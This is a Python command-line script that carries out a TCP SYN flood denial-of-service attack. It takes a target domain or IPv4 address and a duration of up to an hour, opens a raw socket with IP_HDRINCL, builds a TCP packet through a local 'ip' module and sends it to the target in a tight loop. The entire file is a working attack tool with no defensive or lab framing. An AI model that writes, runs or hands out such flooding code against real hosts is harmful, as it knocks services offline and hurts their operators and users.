# Initiates a syn flood attack against a particular target

import argparse
import random
import socket
import os
import sys
import time

# be able to import from parent directory
sys.path.insert(0, os.path.pardir)

import ip
import resolve

from defs import MIN_PORT, MAX_PORT

def parse_args():
    parser = argparse.ArgumentParser(
        description='TCP SYN flood attack'
    )
    parser.add_argument(
        '-d', '--duration',
        metavar='duration',
        dest='duration',
        type=int,
        choices=range(1, 3600),
        required=True,
        help='set duration of attack between 1 and 3600 seconds'
    )
    parser.add_argument(
        '-t', '--target',
        metavar='target',
        dest='target',
        required=True,
        help='specify domain name/IPv4 address to attack'
    )

    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()

    target_ip = resolve.resolve_host(args.target)
    if target_ip is None:
        print('[!] Unable to launch attack')
        sys.exit(1)

    try:
        sock = socket.socket(
            socket.AF_INET,
            socket.SOCK_RAW,
            socket.IPPROTO_TCP
        )
    except IOError as e:
        print('[!] Failed to create raw socket')
        print('[!] Unable to attack %s' % args.target)
        print('[!] Error: %s' % e)
        sys.exit(1)

    try:
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except IOError as e:
        print('[!] Failed to set IP_HDRINCL')
        print('[!] Unable to attack %s' % args.target)
        print('[!] Error: %s' % e)
        sock.close()
        sys.exit(1)

    flags = flags = [0, 1, 0, 0, 0, 0]
    port = random.randint(MIN_PORT, MAX_PORT)
    syn_pack = ip.craft_tcp_packet(target_ip, port, flags)

    t_end = time.time() + args.duration
    while time.time() < t_end:
        sock.sendto(syn_pack, (target_ip, 0))
